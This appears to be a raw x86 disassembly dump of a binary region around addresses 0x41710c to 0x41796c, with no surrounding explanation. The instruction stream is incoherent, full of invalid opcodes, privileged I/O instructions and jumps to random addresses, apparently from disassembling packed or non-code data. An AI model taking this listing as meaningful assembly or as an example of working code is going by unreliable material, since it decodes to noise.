  41710c:	jb     0x417127
  41710e:	inc    edx
  41710f:	mov    esi,0x4b1844
  417114:	jns    0x41711f
  417116:	push   eax
  417117:	lahf   
  417118:	add    ecx,DWORD PTR [edx]
  41711a:	sub    esi,edi
  41711c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41711d:	mov    bh,BYTE PTR [edi-0x35]
  417120:	xor    al,0xd2
  417122:	adc    al,0xd6
  417124:	js     0x417100
  417126:	test   DWORD PTR [edx-0x3],esi
  417129:	push   edx
  41712a:	outs   dx,DWORD PTR ds:[esi]
  41712b:	cs ret 
  41712d:	and    edi,edi
  41712f:	sti    
  417130:	fist   DWORD PTR [edx+0x387f393e]
  417136:	add    BYTE PTR gs:[ebx],al
  417139:	call   0x435b198f
  41713e:	pop    ds
  41713f:	push   eax
  417140:	mov    esi,0xd97dd2d6
  417145:	sbb    eax,0xe1f2bb0d
  41714a:	and    dl,BYTE PTR [edi]
  41714c:	or     eax,0x486c2fc1
  417151:	int    0xd2
  417153:	repz adc DWORD PTR [edi+eiz*4],eax
  417157:	cld    
  417158:	push   esi
  417159:	xchg   edx,eax
  41715a:	cmp    ch,dh
  41715c:	mov    ah,0x6a
  41715e:	mov    dl,0x7c
  417160:	scas   al,BYTE PTR es:[edi]
  417161:	and    eax,0xb31ce746
  417166:	or     al,0x24
  417168:	hlt    
  417169:	ret    
  41716a:	xor    ah,BYTE PTR [esp+eax*4-0x54412ca9]
  417171:	sbb    ch,BYTE PTR [eax+0x357042eb]
  417177:	sahf   
  417178:	div    BYTE PTR [ecx+0x11]
  41717b:	cli    
  41717c:	arpl   WORD PTR [esi+edi*8+0x6db74719],sp
  417183:	xlat   BYTE PTR ds:[ebx]
  417184:	jle    0x4171a0
  417186:	sub    DWORD PTR [esp+eiz*8+0x5d6986ed],edx
  41718d:	mov    esi,0x3492a253
  417192:	jb     0x41716c
  417194:	mov    WORD PTR [esi-0x6],gs
  417197:	loope  0x41713b
  417199:	xchg   ebx,eax
  41719a:	pop    ds
  41719b:	xor    al,0xdf
  41719d:	xor    ah,BYTE PTR [ecx+0xe49e5e2]
  4171a3:	data16 data16 and cl,dh
  4171a7:	out    0x57,al
  4171a9:	sbb    DWORD PTR [edi],esi
  4171ab:	cmc    
  4171ac:	shr    BYTE PTR [edx+0x2f],1
  4171af:	sub    esp,DWORD PTR [ecx+0x697380ed]
  4171b5:	mov    WORD PTR [ebp+0x61],?
  4171b8:	popa   
  4171b9:	pusha  
  4171ba:	dec    edx
  4171bb:	push   ecx
  4171bc:	inc    ebx
  4171bd:	test   BYTE PTR [esi+ebp*1],0x6f
  4171c1:	mov    bl,0x6f
  4171c3:	nop
  4171c4:	loope  0x4171b3
  4171c6:	pusha  
  4171c7:	inc    ebp
  4171c8:	add    BYTE PTR [esi+0x4a],0x45
  4171cc:	test   al,0xe3
  4171ce:	out    dx,eax
  4171cf:	push   0xffffffa8
  4171d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171d2:	mov    ecx,0xd6f7f8fc
  4171d7:	aam    0x31
  4171d9:	jmp    0x52aee99e
  4171de:	ins    DWORD PTR es:[edi],dx
  4171df:	sub    DWORD PTR [ecx],edx
  4171e1:	fsub   DWORD PTR [edi-0xea6ea1c]
  4171e7:	sub    DWORD PTR [eax-0x4a],ecx
  4171ea:	mov    DWORD PTR [ecx-0x530143c0],ebp
  4171f0:	fsubrp st(0),st
  4171f2:	dec    edx
  4171f3:	ins    BYTE PTR es:[edi],dx
  4171f4:	jg     0x417255
  4171f6:	mov    al,0x13
  4171f8:	adc    esp,DWORD PTR [esi+0x76]
  4171fb:	loop   0x417231
  4171fd:	mov    al,ch
  4171ff:	sbb    eax,0x1b5dd293
  417204:	or     ch,dh
  417206:	ret    0x5aa6
  417209:	gs sbb bh,cl
  41720c:	adc    al,0xeb
  41720e:	hlt    
  41720f:	sbb    eax,0x3deb3cd2
  417214:	jge    0x417278
  417216:	inc    esp
  417217:	aam    0x2b
  417219:	pop    edx
  41721a:	or     eax,0x7425568e
  41721f:	fcom   QWORD PTR [esi+0x24]
  417222:	sbb    BYTE PTR [edx],dl
  417224:	dec    esi
  417225:	xchg   edi,eax
  417226:	loope  0x417236
  417228:	mov    edx,0x97d94bf5
  41722d:	push   0x4b04d69
  417232:	int    0x99
  417234:	repz (bad) [edx]
  417237:	ins    DWORD PTR es:[edi],dx
  417238:	cmp    eax,0x9eb0b0e4
  41723d:	popf   
  41723e:	push   es
  41723f:	pop    ecx
  417240:	repz push ecx
  417242:	push   edx
  417243:	test   dl,ch
  417245:	rcl    edx,0xb
  417248:	aaa    
  417249:	std    
  41724a:	sar    BYTE PTR [eax],cl
  41724c:	ror    BYTE PTR [ecx+0x57],cl
  41724f:	mov    ebp,0x593f0cf5
  417254:	repz fisub WORD PTR [edi-0x22]
  417258:	in     eax,dx
  417259:	nop
  41725a:	mov    edi,0x1444b7ed
  41725f:	push   ebp
  417260:	aas    
  417261:	data16 (bad) 
  417263:	pop    esp
  417264:	(bad)  
  417265:	xchg   ebp,eax
  417266:	cmp    al,0xef
  417268:	adc    eax,0xa481a628
  41726d:	std    
  41726e:	mov    ch,0xa9
  417270:	pop    ss
  417271:	jne    0x417221
  417273:	push   esp
  417274:	xor    esp,DWORD PTR [edx+0x69]
  417277:	mov    ds:0x1f61b154,al
  41727c:	fcomp  DWORD PTR [edi+ebp*1+0x32de07a2]
  417283:	inc    ebx
  417284:	es (bad) 
  417286:	mov    WORD PTR [edi-0x56],gs
  417289:	jne    0x417284
  41728b:	jno    0x4172f5
  41728d:	neg    DWORD PTR [ebp-0x36f750b8]
  417293:	aaa    
  417294:	and    BYTE PTR [ecx],0xcf
  417297:	dec    ecx
  417298:	sbb    ah,ah
  41729a:	mov    eax,ds:0x84026a44
  41729f:	cmp    dh,BYTE PTR [eax+0x33]
  4172a2:	movmskps ebx,xmm6
  4172a5:	sub    BYTE PTR [edi],0x9f
  4172a8:	sbb    DWORD PTR [ecx+edx*2+0x1e3e3675],edi
  4172af:	sete   BYTE PTR [ebp+ecx*2+0x7cc9a3f0]
  4172b7:	aad    0x81
  4172b9:	dec    ebp
  4172ba:	repz addr16 jmp 0x309c:0x1c9d
  4172c2:	test   al,0x9e
  4172c4:	popa   
  4172c5:	hlt    
  4172c6:	xchg   ebp,eax
  4172c7:	nop
  4172c8:	mov    eax,DWORD PTR [ebp+ecx*2+0x42986a3e]
  4172cf:	mov    esi,0xbbed47f4
  4172d4:	pop    ss
  4172d5:	and    BYTE PTR [ebx+0x53e8412c],ch
  4172db:	lds    eax,FWORD PTR [ebx]
  4172dd:	sti    
  4172de:	int3   
  4172df:	int3   
  4172e0:	arpl   WORD PTR ds:0xd5c02d43,bx
  4172e6:	arpl   WORD PTR [esi-0x5f9f3671],si
  4172ec:	pop    es
  4172ed:	lahf   
  4172ee:	sar    BYTE PTR [ebp-0xb6f082e],0xf
  4172f5:	inc    ebx
  4172f6:	mov    DWORD PTR [edi-0x52e0a626],eax
  4172fc:	ffree  st(0)
  4172fe:	leave  
  4172ff:	call   0x5207:0xee14e984
  417306:	loopne 0x41729c
  417308:	scas   al,BYTE PTR es:[edi]
  417309:	xchg   esi,eax
  41730a:	xchg   esp,eax
  41730b:	cmp    eax,0xddbfb025
  417310:	sbb    DWORD PTR ds:0x10954b22,esi
  417316:	(bad)  
  417317:	pop    esp
  417318:	cwde   
  417319:	mov    ds:0x18f11516,eax
  41731e:	popa   
  41731f:	ins    DWORD PTR es:[edi],dx
  417320:	jle    0x4172a4
  417322:	out    dx,al
  417323:	lahf   
  417324:	add    edx,ebx
  417326:	sahf   
  417327:	pushf  
  417328:	test   BYTE PTR [edi+0x74],dl
  41732b:	ss das 
  41732d:	inc    eax
  41732f:	(bad)  
  417330:	jl     0x417332
  417332:	sub    ch,BYTE PTR [edx+0x76]
  417335:	sub    ecx,DWORD PTR ds:0x9fa268d3
  41733b:	push   edx
  41733c:	xchg   ebp,eax
  41733d:	fwait
  41733e:	and    al,0x50
  417340:	or     eax,DWORD PTR [esi+0x2d]
  417343:	and    ch,BYTE PTR [edx+ebp*4]
  417346:	std    
  417347:	jecxz  0x41738c
  417349:	mov    bl,0xf0
  41734b:	pop    edx
  41734c:	loop   0x417334
  41734e:	jae    0x4172d9
  417350:	adc    bh,0x39
  417353:	fmul   st,st(3)
  417355:	mov    DWORD PTR [edi],ecx
  417357:	jns    0x417337
  417359:	dec    ebp
  41735a:	nop
  41735b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41735c:	pop    esi
  41735d:	retf   
  41735e:	in     al,0x71
  417360:	sub    cl,al
  417362:	cwde   
  417363:	pop    esp
  417364:	jb     0x4173b9
  417366:	or     eax,0x364002eb
  41736b:	jmp    0xf2d62839
  417370:	call   0x5da724a3
  417375:	retf   
  417376:	frstor [edi+0x68]
  417379:	dec    edi
  41737a:	push   esi
  41737b:	inc    edi
  41737c:	mov    gs,WORD PTR [esi+0x47]
  41737f:	fidivr WORD PTR [ebp-0x2a]
  417382:	ret    
  417383:	cs push cs
  417385:	xchg   ecx,eax
  417386:	sbb    DWORD PTR [ebp+ebx*8-0x75fe1e6f],ebx
  41738d:	call   0x435d6792
  417392:	pusha  
  417393:	ret    0x4db3
  417396:	jne    0x41735c
  417398:	loopne 0x417381
  41739a:	lahf   
  41739b:	cmp    al,0x71
  41739d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41739e:	cmp    eax,0xe85fd95f
  4173a3:	sbb    al,0xe2
  4173a5:	mov    dl,0x6f
  4173a7:	sub    al,0x6
  4173a9:	dec    edi
  4173aa:	jle    0x4173ee
  4173ac:	push   edx
  4173ad:	cmp    dl,cl
  4173af:	push   cs
  4173b0:	jmp    0x41742a
  4173b2:	inc    ebp
  4173b3:	pop    edi
  4173b4:	(bad)  
  4173b6:	adc    esp,esi
  4173b8:	pop    ds
  4173b9:	mov    ds:0x7734f1ee,al
  4173be:	xor    eax,0x529f3c68
  4173c3:	int3   
  4173c4:	lods   eax,DWORD PTR ds:[esi]
  4173c5:	fild   WORD PTR [ecx-0x80]
  4173c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173c9:	fdiv   DWORD PTR [ecx+0x62e09293]
  4173cf:	add    eax,0x5238f31a
  4173d4:	daa    
  4173d5:	(bad)  
  4173d6:	hlt    
  4173d7:	popf   
  4173d8:	adc    BYTE PTR [ecx+0x7c],al
  4173db:	jb     0x417431
  4173dd:	mov    ah,0x9c
  4173df:	imul   BYTE PTR [edx]
  4173e1:	push   edi
  4173e2:	clc    
  4173e3:	sbb    al,0x65
  4173e5:	hlt    
  4173e6:	jmp    0xd492:0x5b6bea29
  4173ed:	sbb    al,0xa3
  4173ef:	lods   al,BYTE PTR ds:[esi]
  4173f0:	pop    edx
  4173f1:	sar    BYTE PTR [eax+esi*8+0x72],0x56
  4173f6:	pop    edx
  4173f7:	popw   ds
  4173f9:	lods   eax,DWORD PTR ds:[esi]
  4173fa:	mov    dh,0x39
  4173fc:	xor    eax,0xd01c3d57
  417401:	cmp    DWORD PTR fs:[ebx+0x2b],edx
  417405:	and    al,0xb
  417407:	jp     0x417488
  417409:	add    BYTE PTR [ebp+ecx*8+0x1d62028],dl
  417410:	in     eax,dx
  417411:	nop
  417412:	ficom  WORD PTR [esi-0x7581bcc4]
  417418:	mov    dl,0x30
  41741a:	pop    es
  41741b:	mov    ds:0xe975d30f,al
  417420:	ds es out dx,eax
  417423:	shl    ah,cl
  417425:	dec    ecx
  417426:	cli    
  417427:	pushf  
  417428:	jb     0x41749c
  41742a:	jl     0x4173c2
  41742c:	lahf   
  41742d:	ficomp WORD PTR [ecx+edi*1-0x1d]
  417431:	lods   eax,DWORD PTR ds:[esi]
  417432:	sub    dl,BYTE PTR [ebx+0x77e6d73e]
  417438:	sar    BYTE PTR [eax-0x44],cl
  41743b:	int    0xe0
  41743d:	mov    ch,0x1c
  41743f:	xchg   ebx,eax
  417440:	jle    0x417414
  417442:	ds nop
  417444:	xor    BYTE PTR [ebx+edx*1+0x3b7c72f8],cl
  41744b:	mov    edi,0x7b273a8d
  417450:	sub    eax,0xf4f09ad0
  417455:	cmc    
  417456:	loop   0x41744e
  417458:	inc    edi
  417459:	pop    ds
  41745a:	push   ds
  41745b:	mov    esp,0x3c210214
  417460:	pop    esp
  417461:	retf   
  417462:	outs   dx,BYTE PTR ds:[esi]
  417463:	fwait
  417464:	mov    edi,0xd854196
  417469:	lock sbb bh,BYTE PTR [ebx-0x2617b3aa]
  417470:	dec    esp
  417471:	xchg   ecx,eax
  417472:	cmc    
  417473:	jp     0x417475
  417475:	push   edi
  417476:	lods   al,BYTE PTR ds:[esi]
  417477:	mov    ds:0xce8e40c2,eax
  41747c:	outs   dx,BYTE PTR ds:[esi]
  41747d:	pop    ecx
  41747e:	dec    ecx
  41747f:	jbe    0x41749f
  417481:	ret    
  417482:	outs   dx,DWORD PTR ds:[esi]
  417483:	jge    0x417496
  417485:	sub    BYTE PTR [ebx-0x6d2d9d46],0xeb
  41748c:	push   0x2a
  41748e:	repnz xchg edi,eax
  417490:	jne    0x41746a
  417492:	xor    bh,BYTE PTR [ebx+0x2d]
	...
  417514:	aad    0x80
  417516:	pusha  
  417517:	cld    
  417518:	jne    0x417516
  41751a:	(bad)  [ecx+0x32bc8e94]
  417520:	int    0x3d
  417522:	push   edi
  417523:	push   ss
  417524:	stc    
  417525:	pop    ss
  417526:	add    DWORD PTR [eax],eax
  417528:	imul   eax,DWORD PTR [edi],0xd2fe0000
  41752e:	addr16 mov bh,0xc6
  417531:	cmp    al,0x5f
  417533:	int3   
  417534:	xchg   edi,eax
  417535:	cmp    DWORD PTR [ecx-0xfd20dd1],edi
  41753b:	in     al,dx
  41753c:	mov    cl,al
  41753e:	jge    0x4174ee
  417540:	or     eax,0x1f28ada1
  417545:	pop    eax
  417546:	adc    edi,0x44cbfec
  41754c:	inc    ecx
  41754d:	cs stc 
  41754f:	sbb    al,0xbf
  417551:	xchg   DWORD PTR fs:[esp+eax*4-0x7b],esp
  417556:	or     eax,0x75e58ed9
  41755b:	or     esp,eax
  41755d:	xor    bl,BYTE PTR [ecx+0xf]
  417560:	lea    edi,[bp+di+0x4]
  417564:	dec    eax
  417565:	mov    edx,eax
  417567:	lods   al,BYTE PTR ds:[esi]
  417568:	scas   eax,DWORD PTR es:[edi]
  417569:	mov    edx,0xcc861bdf
  41756e:	cmp    DWORD PTR [edx-0x12],ecx
  417571:	jnp    0x4175af
  417573:	gs jmp 0x6b98:0x63a9272c
  41757b:	lock xor bl,al
  41757e:	sub    bl,BYTE PTR [edi+0x43]
  417581:	pop    edx
  417582:	mov    esp,0xa6ec98a2
  417587:	sub    BYTE PTR [eax+edx*4],bh
  41758a:	adc    BYTE PTR [edi-0x5d],0x67
  41758e:	jg     0x41756e
  417590:	aam    0x12
  417592:	pop    edi
  417593:	fcomp  st(5)
  417595:	dec    ecx
  417596:	(bad)  
  417597:	jnp    0x417560
  417599:	(bad)  
  41759b:	ins    BYTE PTR es:[edi],dx
  41759c:	push   esi
  41759d:	jne    0x4175a0
  41759f:	or     al,0x52
  4175a1:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175a3:	pop    ss
  4175a4:	xchg   esi,eax
  4175a5:	retf   0xb00f
  4175a8:	sbb    bh,BYTE PTR [ecx-0x17e3a6de]
  4175ae:	lea    ebx,[ecx+0x31212ae]
  4175b4:	loop   0x417591
  4175b6:	outs   dx,DWORD PTR ds:[esi]
  4175b7:	nop
  4175b8:	inc    eax
  4175b9:	jne    0x417637
  4175bb:	add    edi,DWORD PTR [edi-0x5b]
  4175be:	pop    ebp
  4175bf:	scas   eax,DWORD PTR es:[edi]
  4175c0:	aas    
  4175c1:	scas   al,BYTE PTR es:[edi]
  4175c2:	fucom  st(0)
  4175c4:	add    dh,bh
  4175c6:	mov    bl,0x50
  4175c8:	ficom  DWORD PTR [edi]
  4175ca:	push   esp
  4175cb:	iret   
  4175cc:	daa    
  4175cd:	sar    BYTE PTR [edx-0x1b],1
  4175d0:	fstp   TBYTE PTR [edi-0x8]
  4175d3:	(bad)  
  4175d4:	pop    eax
  4175d5:	xchg   ebx,eax
  4175d6:	lahf   
  4175d7:	stos   DWORD PTR es:[edi],eax
  4175d8:	pop    esp
  4175d9:	dec    esi
  4175da:	push   ebx
  4175db:	mov    edx,DWORD PTR [edi+0x16052d02]
  4175e1:	cmp    DWORD PTR [ecx+edx*1],ebx
  4175e4:	rcr    BYTE PTR [edi+edx*1+0x66],0xf7
  4175e9:	cmp    ecx,DWORD PTR [ecx-0x3f]
  4175ec:	xor    eax,esi
  4175ee:	push   edx
  4175ef:	jg     0x4175f1
  4175f1:	mov    ah,0x6b
  4175f3:	mov    dh,0xa9
  4175f5:	cmc    
  4175f6:	mov    bh,0x33
  4175f8:	mov    al,0x8c
  4175fa:	mov    al,0x73
  4175fc:	aad    0xf0
  4175fe:	sbb    ebx,DWORD PTR [edi-0x52c622a1]
  417604:	push   ss
  417605:	xchg   esp,eax
  417606:	jae    0x417597
  417608:	lds    esi,FWORD PTR [ebp+0x7d2fc37c]
  41760e:	fild   QWORD PTR [edi]
  417610:	je     0x4175a9
  417612:	jmp    0x48b7:0x84ff0c07
  417619:	push   esp
  41761a:	sub    BYTE PTR [eax],ch
  41761c:	iret   
  41761d:	xor    DWORD PTR [eax+0x67bdfbd8],edx
  417623:	mov    ds:0xb005103,eax
  417628:	sbb    ebp,DWORD PTR [ebx]
  41762a:	aas    
  41762b:	jmp    0x417687
  41762d:	sub    DWORD PTR [ebx-0x3f],esi
  417630:	ja     0x417643
  417632:	addr16 push ss
  417634:	xchg   BYTE PTR [esi-0x4c],bh
  417637:	sahf   
  417638:	jb     0x417632
  41763a:	les    esp,FWORD PTR [ebp-0x11ddb938]
  417640:	dec    edi
  417641:	mov    dl,0xa7
  417643:	or     al,ch
  417645:	push   eax
  417646:	cmc    
  417647:	inc    edi
  417648:	out    0xc,eax
  41764a:	bound  esp,QWORD PTR [ebx+edi*2-0x4fbf5f10]
  417651:	or     eax,0xd085c88b
  417656:	retf   
  417657:	outs   dx,DWORD PTR ds:[esi]
  417658:	lea    esp,[edi-0x16]
  41765b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41765c:	imul   esi,DWORD PTR [esi-0x5c0e5a25],0x22
  417663:	test   eax,0x56ce7189
  417668:	dec    ebx
  417669:	pop    ebp
  41766a:	sub    BYTE PTR [ebx+0x548720d6],0x30
  417671:	push   ebx
  417672:	jns    0x4176dd
  417674:	loop   0x417620
  417676:	adc    esi,DWORD PTR [ebp-0x46]
  417679:	mov    ecx,0xef2ae354
  41767e:	jle    0x41763f
  417680:	jecxz  0x41767e
  417682:	pop    edx
  417683:	out    dx,al
  417684:	xchg   esp,eax
  417685:	jge    0x417706
  417687:	in     eax,0x71
  417689:	(bad)  [esi-0x1e8643ff]
  41768f:	ja     0x41768e
  417691:	stc    
  417692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417693:	repnz sub BYTE PTR [eax+0x390f636f],ch
  41769a:	adc    al,0xa9
  41769c:	dec    edx
  41769d:	ror    bl,1
  41769f:	retf   0x9156
  4176a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176a4:	fiadd  DWORD PTR [eax+ebx*1+0x42]
  4176a8:	outs   dx,BYTE PTR fs:[esi]
  4176aa:	mov    eax,ds:0x114b99ba
  4176af:	push   esp
  4176b0:	pop    ecx
  4176b1:	pop    ebx
  4176b2:	sbb    bh,dl
  4176b4:	xlat   BYTE PTR ds:[ebx]
  4176b5:	inc    edi
  4176b6:	in     eax,dx
  4176b7:	xchg   edi,eax
  4176b8:	xor    bh,BYTE PTR [edi]
  4176ba:	into   
  4176bb:	call   0x1bd5e5fc
  4176c0:	cmp    DWORD PTR ds:0x41202f8b,esi
  4176c6:	add    BYTE PTR [esi+0x67],0xe0
  4176ca:	lds    ebp,FWORD PTR [esp+ebx*4+0x6b6c36e0]
  4176d1:	cmp    BYTE PTR [edx],al
  4176d3:	and    BYTE PTR [ecx-0x4800b072],bh
  4176d9:	xor    bh,bh
  4176db:	loopne 0x417671
  4176dd:	xchg   edi,eax
  4176de:	mov    edx,DWORD PTR [eax-0x31eac48e]
  4176e4:	loope  0x41771e
  4176e6:	stos   DWORD PTR es:[edi],eax
  4176e7:	xchg   edx,eax
  4176e8:	jp     0x417740
  4176ea:	inc    esi
  4176eb:	mov    edi,0xd3588b6f
  4176f0:	xchg   edi,eax
  4176f1:	iret   
  4176f2:	out    0x82,al
  4176f4:	cld    
  4176f5:	gs mov ch,0x5d
  4176f8:	jp     0x4176ed
  4176fa:	test   al,0x5d
  4176fc:	mov    eax,ds:0xb7222b57
  417701:	pop    edx
  417702:	pop    ebx
  417703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417704:	into   
  417705:	shr    BYTE PTR [edx-0x71402fdc],cl
  41770b:	push   0x7b
  41770d:	stos   BYTE PTR es:[edi],al
  41770e:	push   0x43682614
  417713:	mov    esp,0xbe6eda01
  417718:	fcmove st,st(3)
  41771a:	sbb    DWORD PTR [ecx+0x70],0xc93b8f22
  417721:	xor    dh,BYTE PTR [ebx-0x5d]
  417724:	cdq    
  417725:	into   
  417726:	push   ds
  417727:	sub    BYTE PTR [ebx-0x12],ch
  41772a:	lods   al,BYTE PTR ds:[esi]
  41772b:	in     eax,dx
  41772c:	mov    ch,0xb5
  41772e:	pop    ds
  41772f:	pop    edi
  417730:	xchg   BYTE PTR [edi],dh
  417732:	in     eax,0xda
  417734:	pop    ebp
  417735:	xor    DWORD PTR [ebx],ebp
  417737:	into   
  417738:	add    al,0x69
  41773a:	mov    esp,0xb40b16f0
  41773f:	fld    TBYTE PTR [esi+ebp*4]
  417742:	icebp  
  417743:	sbb    DWORD PTR [ecx+0x6a],esp
  417746:	xchg   esp,eax
  417747:	push   ds
  417748:	sub    BYTE PTR [esi-0x27653861],ch
  41774e:	mov    edx,ss
  417750:	test   DWORD PTR [edi+0x3b],edx
  417753:	and    eax,0xed34ee6c
  417758:	and    bh,BYTE PTR [eax+0x5]
  41775b:	sub    eax,0x27effaba
  417760:	mov    bl,0x8e
  417762:	xchg   DWORD PTR [esi+0x66],esp
  417765:	and    al,0x75
  417767:	imul   bl
  417769:	aaa    
  41776a:	dec    edi
  41776b:	iret   
  41776c:	jmp    0x49ec:0x70292e84
  417773:	xchg   ecx,eax
  417774:	sub    edi,edx
  417776:	test   BYTE PTR [edi],al
  417778:	sub    bh,al
  41777a:	mov    ds:0x92e2e17f,eax
  41777f:	stc    
  417780:	call   FWORD PTR [esi+ecx*1+0x2f]
  417784:	aaa    
  417785:	mul    edi
  417787:	les    esi,FWORD PTR [eax]
  417789:	retw   0x4a00
  41778d:	xor    ah,BYTE PTR [ebp-0x4dd49f53]
  417793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417794:	pop    eax
  417795:	or     eax,0xe97594a3
  41779a:	mov    dh,0x9c
  41779c:	int3   
  41779d:	xchg   ebp,eax
  41779e:	nop
  41779f:	fild   WORD PTR [ecx-0x449b7b59]
  4177a5:	outs   dx,DWORD PTR ds:[esi]
  4177a6:	cmp    edx,DWORD PTR [ecx+0x39]
  4177a9:	ficom  WORD PTR [edi+edx*4]
  4177ac:	jbe    0x41776f
  4177ae:	sub    DWORD PTR [edi-0x80],esi
  4177b1:	add    al,0x54
  4177b3:	fisubr DWORD PTR [ecx]
  4177b5:	ds iret 
  4177b7:	mov    ah,0xa6
  4177b9:	outs   dx,BYTE PTR ds:[si]
  4177bb:	push   ebx
  4177bc:	in     eax,0x18
  4177be:	mov    al,ds:0xfeca8971
  4177c3:	pop    ss
  4177c4:	loope  0x417841
  4177c6:	mov    al,ds:0x5002f553
  4177cb:	ret    0x8394
  4177ce:	dec    esi
  4177cf:	hlt    
  4177d0:	aad    0x8f
  4177d2:	(bad)  
  4177d3:	mov    ebx,0x9df34a20
  4177d8:	fwait
  4177d9:	(bad)  
  4177da:	mov    bh,0x3e
  4177dc:	jae    0x41781d
  4177de:	mov    esi,0xb6779b39
  4177e3:	dec    ecx
  4177e4:	int    0xe
  4177e6:	enter  0x703d,0x24
  4177ea:	stc    
  4177eb:	and    DWORD PTR [edi+0x3707dd7b],esi
  4177f1:	jmp    0x41782f
  4177f3:	pop    ds
  4177f4:	(bad)  
  4177f8:	outs   dx,BYTE PTR ds:[esi]
  4177f9:	je     0x4177db
  4177fb:	xchg   ecx,eax
  4177fc:	iret   
  4177fd:	dec    DWORD PTR [edx]
  4177ff:	div    esp
  417801:	js     0x417820
  417803:	mov    edi,0x78eb6be7
  417808:	push   ds
  417809:	mov    al,ds:0x3accc9d8
  41780e:	xor    bh,dh
  417810:	and    al,bl
  417812:	rcr    DWORD PTR [eax+0x2625d983],cl
  417818:	dec    edx
  417819:	mov    esi,0x21f42370
  41781e:	sbb    edx,DWORD PTR [ecx-0x6c]
  417821:	jmp    0x41789b
  417823:	stc    
  417824:	fst    QWORD PTR [esi+0x44acb03e]
  41782a:	cdq    
  41782b:	ret    0x157f
  41782e:	xchg   esi,eax
  41782f:	adc    eax,DWORD PTR [edi+0x43]
  417832:	push   ecx
  417833:	mov    esi,0xcaebfba1
  417838:	sub    eax,0x9ef3bf17
  41783d:	cwde   
  41783e:	lods   eax,DWORD PTR ds:[esi]
  41783f:	sub    eax,0x7bb5628a
  417844:	mov    WORD PTR [eax*8+0x51ef93dc],fs
  41784b:	push   0x4a
  41784d:	adc    eax,0xfd48b082
  417852:	sub    eax,0x1dccb40
  417857:	push   edi
  417858:	cmp    DWORD PTR [esi+0x5e750ade],esp
  41785e:	shl    BYTE PTR [ebp-0x1b59611c],1
  417864:	push   ebx
  417865:	adc    al,0x3b
  417867:	iret   
  417868:	dec    esi
  417869:	mov    ah,0xa4
  41786b:	pushf  
  41786c:	retf   0x71a3
  41786f:	aaa    
  417870:	jge    0x41786f
  417872:	neg    DWORD PTR [edx-0x28]
  417875:	inc    edx
  417876:	sub    al,0xfd
  417878:	mov    eax,0xab436c4c
  41787d:	and    BYTE PTR [edx+0x123951ef],dl
  417883:	mov    dl,ch
  417885:	pop    edi
  417886:	and    al,0xcd
  417888:	pop    eax
  417889:	in     al,dx
  41788a:	jmp    0x7b36:0xd6a40070
  417891:	mov    al,ds:0x4b00cb5d
  417896:	mov    ecx,0x35c2da8d
  41789b:	cmp    BYTE PTR [ebp-0x68],0xc0
  41789f:	mov    WORD PTR [ebx],cs
  4178a1:	clc    
  4178a2:	fmul   DWORD PTR cs:[ebx-0x19c2482e]
  4178a9:	mov    ds:0x6adee65,al
  4178ae:	pushf  
  4178af:	loopne 0x417842
  4178b1:	dec    esi
  4178b2:	dec    edx
  4178b3:	sbb    al,0x63
  4178b5:	cmp    eax,0x62549c2a
  4178ba:	mov    ebp,0xd9ccaddd
  4178bf:	jmp    0x417850
  4178c1:	pop    ebp
  4178c2:	test   DWORD PTR [esi+0xc],esi
  4178c5:	sar    BYTE PTR [ebp-0x1d],cl
  4178c8:	mov    esp,0x73d1a4cc
  4178cd:	push   cs
  4178ce:	mov    ds,WORD PTR [edi-0x12]
  4178d1:	sbb    bl,BYTE PTR [eax+ebp*1]
  4178d4:	mov    edi,0x32606df0
  4178d9:	add    ebx,DWORD PTR [ecx-0xb]
  4178dc:	cmp    bl,BYTE PTR [edi+ecx*4]
  4178df:	mov    bh,0x6
  4178e1:	leave  
  4178e2:	sbb    al,0x27
  4178e4:	push   edi
  4178e5:	xchg   esi,eax
  4178e6:	cmp    al,0xc9
  4178e8:	out    dx,eax
  4178e9:	imul   edi,ecx,0xffffffc2
  4178ec:	pop    ebp
  4178ed:	leave  
  4178ee:	lds    ebx,FWORD PTR [ebp+0x4a8b3823]
  4178f4:	call   0xcace8dc0
  4178f9:	mov    dl,0x54
  4178fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178fc:	pop    es
  4178fd:	or     dl,BYTE PTR [edi]
  4178ff:	mov    cl,0x3
  417901:	fisub  WORD PTR [ebx-0x2b]
  417904:	sti    
  417905:	cdq    
  417906:	pusha  
  417907:	aad    0xfb
  417909:	aas    
  41790a:	adc    edx,DWORD PTR [ebx-0x4da545f2]
  417910:	dec    ebp
  417911:	jae    0x4178cf
  417913:	in     eax,0x1f
  417915:	cld    
  417916:	inc    eax
  417917:	inc    eax
  417918:	aad    0x8a
  41791a:	es jae 0x417939
  41791d:	cmp    DWORD PTR [esi],edx
  41791f:	loope  0x417990
  417921:	(bad)  
  417922:	(bad)  
  417923:	mov    ebx,0x69d6bdb2
  417928:	cwde   
  417929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41792a:	xor    DWORD PTR [edx],esi
  41792c:	dec    eax
  41792d:	jb     0x4178c8
  41792f:	and    BYTE PTR [ebp+0x50],cl
  417932:	int    0x78
  417934:	nop
  417935:	push   ds
  417936:	xor    ebx,edx
  417938:	xchg   esp,eax
  417939:	dec    eax
  41793a:	and    al,0xe
  41793c:	and    dh,BYTE PTR [ecx-0x6819ff25]
  417942:	ret    
  417943:	cmc    
  417944:	pop    esi
  417945:	dec    esi
  417946:	es push ds
  417948:	and    DWORD PTR [ebx],0x36b9d9f4
  41794e:	call   0x62fcb96a
  417953:	xor    DWORD PTR [ecx+0x19fbcbcb],esp
  417959:	ja     0x4178ec
  41795b:	cmp    eax,0xf40cbe6c
  417960:	mov    ebx,0x93c7c04
  417965:	xchg   edx,eax
  417966:	pop    ecx
  417967:	mov    edi,0x7475d63d
  41796c:	sub    ecx,eax
